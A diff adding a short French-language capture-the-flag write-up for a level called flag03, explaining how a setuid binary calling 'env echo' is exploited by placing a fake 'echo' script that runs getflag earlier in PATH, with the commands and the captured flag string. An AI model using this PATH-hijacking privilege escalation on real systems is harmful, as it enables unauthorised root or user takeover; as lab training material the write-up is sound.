@@ -54,3 +54,29 @@ ft_waNDReL0L
 
 ## Flag : kooda2puivaav1idi4f57q8iq
 
+# flag03
+
+ouverture de level03 (executable dans ghidra):
+setresgid et setresuid avec l'user flag03
+et ensuite la commande executée est /usr/bin/env echo Exploit me
+
+il suffit de créer un executable nommée echo et le mettre plus tôot dans le PATH:
+
+cd ..
+chmod 777 level03
+(set les permissions pour écrire dans notre home)
+nano echo
+
+#!/bin/bash
+
+getflag
+
+export PATH="/home/user/level03:$PATH"
+
+chmod +x echo
+
+./level03
+
+## flag : qi0maab88jeaj46qoumi7maus
+
+# Flag04
